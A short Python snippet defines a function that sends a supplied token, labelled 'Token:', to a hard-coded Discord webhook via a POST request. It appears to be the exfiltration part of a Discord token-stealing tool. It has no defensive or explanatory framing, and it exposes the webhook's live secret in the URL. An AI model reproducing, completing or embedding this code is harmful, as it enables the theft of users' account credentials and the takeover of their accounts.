import requests
import json

def gettoki(token):
    url = "https://discord.com/api/webhooks/1347607587738222662/eZw1HDWRml4Qwz8QRf8t-u7355g8owcBpv7ptyZCysEgcuT6r_OG5ZOitLmZCCMkEwJL"
    payload = {"content":f"Token: {token}"}
    response = requests.post(url, data=json.dumps(payload),headers={"Content-Type": "application/json"})